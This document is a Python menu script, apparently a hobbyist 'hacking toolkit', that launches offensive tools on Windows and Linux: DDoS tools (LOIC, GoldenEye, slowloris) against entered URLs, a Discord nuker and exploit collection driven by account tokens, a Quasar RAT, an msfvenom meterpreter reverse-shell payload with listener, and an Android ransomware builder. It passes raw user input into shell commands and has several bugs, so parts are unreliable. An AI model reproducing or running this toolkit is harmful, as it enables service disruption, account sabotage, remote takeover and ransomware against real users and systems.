#importazione pacchetti esterni

import os
import time
import random
import socket
import sys
import webbrowser
import subprocess
import platform
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


#inizio codice
if(platform.system() == "Windows"):
    os.system("cls")
    print("\n welcome to these open source code created by LunarStone292")
    print("\n these are the tools:")
    print("\n\n 1. LOIC (Low Bandit Ion Canon)")
    print("\n 2. nmap")
    print("\n 3. scrcpy (crea un'interfaccia grafica con un dispositivo android)")
    print("\n 4. discord nuker")
    print("\n 5. Dos Attack")
    print("\n 6. GoldenEye")
    print("\n 7. create a rat with quasar")
    print("\n 8. slowloris")
    print("\n 9. kickthemeout")
    print("\n 10. sherlock-master")
    print("\n 11. discord hack")
    print("\n 12. autoclicker")
    print("\n 13. github")
    print("\n 14. discord")
    print("\n 14. exit")
    scelta = int(input("\n\nroot@windows:# "))
    if(scelta == 1):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n\n you chose LOIC #-----#")
        subprocess.Popen([r"windows/LOIC/LOIC.exe"])
    if(scelta == 2):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n\n you chose nmap")
        nmap_scelta = input("\n\nURL: ")
        test_1 = subprocess.check_output("nmap " + nmap_scelta ).decode('utf-8')
        print("\n\n" + test_1)
    if(scelta == 3):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n\n you chose scrcpy ")
        subprocess.Popen([r"windows/scrcpy-win64/scrcpy.exe"])
    if(scelta == 4):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n\n you chose discord nuker")
        subprocess.Popen([r"windows/AveryNuker-main/avery.exe"])
    if(scelta == 5):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n\n you chose Dos Attack")
        os.system("cd windows & python3 Dos-Attack.py")
    if(scelta == 6):
        if(platform.system() == "Windows"):
            os.system("cls")
        golden = input(" URL: ")
        os.system("cls")
        os.system("cd windows & GoldenEye-master & python3 goldeneye.py " + golden)
    if(scelta == 7):
        if(platform.system() == "Windows"):
            os.system("cls")
        os.system("cd windows & Quasar v1.4.0 & Quasar.exe")
    if(scelta == 8):
        if(platform.system() == "Windows"):
            os.system("cls")
        scelta_url = input(" URL: ")
        os.system("cls")
        os.system("cd windows & slowloris-master & python3 slowloris.py " + scelta_url)
    if(scelta == 9):
        if(platform.system() == "Windows"):
            os.system("cls")
        os.system("cls")
        os.system("cd windows & kickthemout & python3 kickthemout.py")
    if(scelta == 10):
        if(platform.system() == "Windows"):
            os.system("cls")
        os.system("cls")
        nome = input(" enter the username: ")
        os.system("python3 windows/sherlock-master/sherlock/sherlock.py " + nome)
    if(scelta == 11):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n 1. discord tester outage")
        print("\n 2. permanent denial of service")
        print("\n 3. account disabler")
        print("\n 4. block bypass")
        print("\n 5. 2000 characters limit bypass")
        print("\n 6. glitched mention")
        print("\n 7. guild voice channel denial of service")
        print("\n 8. unverify email")
        print("\n 9. windows denial of service")
        print("\n 10. tourn back")
        print("\n 11. exit")
        discord_scelta = int(input("\n root@windows-# "))
        if(discord_scelta == 1):
            token = input("\n token: ")
            channel_id = str(input("\n channel id: "))
            os.system("cd windows & Discord-Exploit-Collection-master & cd patched & cd discord tester outage & python3 example.py " + token + " " + channel_id)
        if(discord_scelta == 2):
            token = input("\n token: ")
            channel_id = str(input("\n channel id: "))
            os.system("cd windows & Discord-Exploit-Collection-master & cd patched & cd permanent denial of service & python3 example.py " + token + " " + channel_id)
        if(discord_scelta == 3):
            token = input("\n token: ")
            os.system("cd windows & Discord-Exploit-Collection-master & cd unpatched & cd api abuse & account disabler & python3 example.py " + token)
        if(discord_scelta == 4):
            token = input("\n token: ")
            client_id = str(input("\n client id: "))
            os.system("cd windows & Discord-Exploit-Collection-master & cd unpatched & cd api abuse & cd block bypass & python3 example.py " + token)
        if(discord_scelta == 5):
            token = input("\n token: ")
            channel_id = str(input("\n client id: "))
            os.system("cd windows & Discord-Exploit-Collection-master & cd unpatched & cd misc & cd 2000 characters limit bypass & python example.py " + token + " " + channel_id)
        if(discord_scelta == 6):
            token = input("\n token: ")
            client_id = str(input("\n client id: "))
            os.system("cd windows & Discord-Exploit-Collection-master & cd unpatched & cd misc & cd glitched mention & python example.py "+ token + " " + channel_id)
        if(discord_scelta == 7):
            token = input("\n token discord: ")
            guild_id = str(input("\n guild id: "))
            os.system("cd windows & Discord-Exploit-Collection-master & cd unpatched & cd misc & cd guild voice channel denial of service & python3 example.py " + token + " " + guild_id)
        if(discord_scelta == 8):
            token = input("\n token discord: ")
            os.system("cd windows & Discord-Exploit-Collection-master & cd unpatched & cd misc & cd unverify email & python3 example.py " + token)
        if(discord_scelta == 9):
            token = input("\n token: ")
            client_id = str(input("\n client id: "))
            os.system("cd windows & Discord-Exploit-Collection-master & cd unpatched & cd uri & cd windows denial of service & python3 example.py " + token + " " + channel_id)
        if(discord_scelta == 10):
            os.system("python3 main.py")
        if(discord_scelta == 11):
            exit
    if(scelta == 12):
        os.system("cls")
        print("premi y per attivarlo/disattivarlo")
        print("\n premi t per uscire")
        os.system("cd windows & python3 autoclicker.py")
    if(scelta == 13):
        os.system("cls")
        print("\n 1. LunarStone292")
        print("\n 2. UsboKirishima")
        github = int(input("\n github@io-# "))
        if(github == 1):
            webbrowser.open('https://github.com/LunarStone292')
            os.system("cls")
        if(github == 2):
            webbrowser.open('https://github.com/UsboKirishima')
            os.system("cls")
        if(github > 2):
            os.system("cls")
            print("\n\n\n\n\n\n\n\n\n             error \n\n\n\n\n\n\n")
        if(github < 1):
            os.system("cls")
            print("\n\n\n\n\n\n\n\n\n             error \n\n\n\n\n\n\n")
    if(scelta == 14):
        os.system("cls")
        print("\n do you want to enter in my discord? (deep-web)")
        discord = input("\n (Y/n)# ")
        if(discord == "Y"):
            webbrowser.open('https://discord.gg/Xs2VN6btbQ')
        if(discord == "y"):
            webbrowser.open('https://discord.gg/Xs2VN6btbQ')
        else:
            os.system("python3 main.py")
    if(scelta == 15):
        exit

    if(scelta > 15):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n\n\n\n\n\nscelta errata, riprova\n\n\n\n\n\n")
    if(scelta < 1):
        if(platform.system() == "Windows"):
            os.system("cls")
        print("\n\n\n\n\n\nscelta errata, riprova\n\n\n\n\n\n")
else:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    host_name = (s.getsockname()[0])
    os.system("clear")
    print("\n welcome to these open source code created by LunarStone292")
    print("\n these are the tools:")
    print("\n 0. install requirements (apt)")
    print("\n 1. nmap")
    print("\n 2. scrcpy (create a graphical interface with an android device)")
    print("\n 3. discord nuker")
    print("\n 4. Dos Attack")
    print("\n 5. GoldenEye")
    print("\n 6. create a rat with metasploit")
    print("\n 7. slowloris")
    print("\n 8. kickthemeout")
    print("\n 9. sherlock-master")
    print("\n 10. discord hack")
    print("\n 11. autoclicker")
    print("\n 12. SARA (make a Ransomware for android)")
    print("\n 13. github")
    print("\n 14. discord")
    print("\n 15. exit")
    scelta_ = int(input("\n\n root@linux:# "))
    if(scelta_ == 0):
        print("\n\n\n you chose install requirements\n\n\n\n\n\n")
        time.sleep(3)
        os.system("clear")
        os.system("apt install nmap & apt install scrcpy & mkdir metasploit")
        os.system("cd metasploit")
        os.system("wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run & chmod +x metasploit-latest-linux-x64-installer.run & ./metasploit-latest-linux-x64-installer.run")
        os.system("./linux/SARA/install.sh")
        time.sleep(2)
        os.system("clear")
        print(" \n\n\n\n do you want to install python requirements? Y/n")
        installer = input("\n\n install@linux-# ")
        if(installer == "Y"):
            os.system("pip3 install pyautogui & pip3 install discord & pip3 install pypresence")
        if(installer == "y"):
            os.system("pip3 install pyautogui")
        if(installer == "N"):
            os.system("clear")
            print("\n\n\n\n\n          finished installation\n\n\n\n\n")
        if(installer == "n"):
            os.system("clear")
            print("\n\n\n\n\n          finished installation\n\n\n\n\n")
    if(scelta_ == 1):
        os.system("clear")
        URL = input(" URL: ")
        os.system("clear")
        prova = os.system("nmap " + URL + " --script vuln")
        print(prova)
    if(scelta_ == 2):
        os.system("clear")
        os.system("scrcpy")
    if(scelta_ == 3):
        os.system("python3 linux/AveryNuker-main/avery.py")
    if(scelta_ == 4):
        os.system("clear")
        os.system("python3 linux/Dos-Attack.py")
    if(scelta_ == 5):
        link_gold = input(" URL: ")
        os.system("python3 linux/GoldenEye-master/goldeneye.py")
    if(scelta_ == 6):
        host = input(" enter the LHOST(" + host_name + "): ")
        lport = str(input(" enter the LPORT(44445): "))
        nome_file = input(" enter the file name: ")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=" + host + " LPORT=" + lport + " -f exe -o " + nome_file + ".exe")
        os.system("clear")
        os.system("msfconsole")
        time.sleep(3)
        os.system("use exploit/multi/handler")
        os.system("set PAYLOAD windows/meterpreter/reverse_tcp")
        os.system("set LHOST " + host)
        os.system("set LPORT " + lport)
        os.system("exploit")
    if(scelta_ == 7):
        url = input(" URL: ")
        os.system("clear")
        os.system("python3 linux/slowloris-master/slowloris.py " + url)
    if(scelta_ == 8):
        os.system("clear")
        os.system("python3 linux/kickthemout/kickthemout.py")
    if(scelta_ == 9):
        username = input(" enter the username: ")
        if(username == "LunarStone292"):
            print(" invalit username")
        else:
            os.system("pyhon3 linux/sherlock-master/sherlock/sherlock.py " + username)
    if(scelta_ == 10):
        os.system("clear")
        print("\n 1. discord tester outage")
        print("\n 2. permanent denial of service")
        print("\n 3. account disabler")
        print("\n 4. block bypass")
        print("\n 5. 2000 characters limit bypass")
        print("\n 6. glitched mention")
        print("\n 7. guild voice channel denial of service")
        print("\n 8. unverify email")
        print("\n 9. windows denial of service")
        print("\n 10. tourn back")
        print("\n 11. exit")
        discord_scelta = int(input("\n root@windows-# "))
        if(discord_scelta == 1):
            token = input("\n token: ")
            channel_id = str(input("\n channel id: "))
            os.system("python3 linux/Discord-Exploit-Collection-master/patched/discord-tester-outage/example.py " + token + " " + channel_id)
        if(discord_scelta == 2):
            token = input("\n token: ")
            channel_id = str(input("\n channel id: "))
            os.system("python3 linux/Discord-Exploit-Collection-master/patched/permanent-denial-of-service/example.py " + token + " " + channel_id)
        if(discord_scelta == 3):
            token = input("\n token: ")
            os.system("python3 linux/Discord-Exploit-Collection-master/unpatched/api-abuse/account-disabler/example.py " + token)
        if(discord_scelta == 4):
            token = input("\n token: ")
            client_id = str(input("\n client id: "))
            os.system("python3 linux/Discord-Exploit-Collection-master/unpatched/api-abuse/block-bypass/example.py " + token)
        if(discord_scelta == 5):
            token = input("\n token: ")
            channel_id = str(input("\n client id: "))
            os.system("python3 linux/Discord-Exploit-Collection-master/unpatched/misc/2000-characters-limit-bypass/example.py " + token + " " + channel_id)
        if(discord_scelta == 6):
            token = input("\n token: ")
            client_id = str(input("\n client id: "))
            os.system("python3 linux/Discord-Exploit-Collection-master/unpatched/misc/glitched-mention/example.py "+ token + " " + channel_id)
        if(discord_scelta == 7):
            token = input("\n token discord: ")
            guild_id = str(input("\n guild id: "))
            os.system("python3 linux/Discord-Exploit-Collection-master/unpatched/misc/guild-voice-channel-denial-of-service/example.py " + token + " " + guild_id)
        if(discord_scelta == 8):
            token = input("\n token discord: ")
            os.system("python3 linux/Discord-Exploit-Collection-master/unpatched/misc/unverify-email/example.py " + token)
        if(discord_scelta == 9):
            token = input("\n token: ")
            client_id = str(input("\n client id: "))
            os.system("python3 linux/Discord-Exploit-Collection-master/unpatched/uri/windows-denial-of-service/example.py " + token + " " + channel_id)
        if(discord_scelta == 10):
            os.system("python3 main.py")
        if(scelta_ == 11):
            exit
        if(scelta_ > 11):
            print("\n\n\n\n\n\nscelta errata, riprova\n\n\n\n\n\n")
    if(scelta_ == 11):
        os.system("clear")
        print("premi y per attivarlo/disattivarlo")
        print("\n premi t per uscire")
        os.system("cd windows & python3 autoclicker.py")
    if(scelta_ == 12):
        os.system("python3 linux/SARA/sara.py")
    if(scelta_ == 13):
        os.system("cls")
        print("\n 1. LunarStone292")
        print("\n 2. UsboKirishima")
        github_ = int(input("\n github@io-# "))
        if(github_ == 1):
            webbrowser.open('https://github.com/LunarStone292')
            os.system("clear")
        if(github_ == 2):
            webbrowser.open('https://github.com/UsboKirishima')
            os.system("clear")
        if(github_ > 2):
            os.system("clear")
            print("\n\n\n\n\n\n\n\n\n             error \n\n\n\n\n\n\n")
        if(github_ < 1):
            os.system("clear")
            print("\n\n\n\n\n\n\n\n\n             error \n\n\n\n\n\n\n")
    if(scelta_ == 14):
        os.system("cls")
        print("\n do you want to enter in my discord? (deep-web)")
        discord_ = input("\n (Y/n)# ")
        if(discord_ == "Y"):
            webbrowser.open('https://discord.gg/Xs2VN6btbQ')
        if(discord_ == "y"):
            webbrowser.open('https://discord.gg/Xs2VN6btbQ')
        else:
            os.system("python3 main.py")
    if(scelta_ == 15):
        exit
    if(scelta_ > 15):
        os.system("clear")
        print("\n\n\n\n\n\n\n\n\n             error \n\n\n\n\n\n\n")
    if(scelta_ < 0):
        os.system("clear")
        print("\n\n\n\n\n\n\n\n\n             error \n\n\n\n\n\n\n")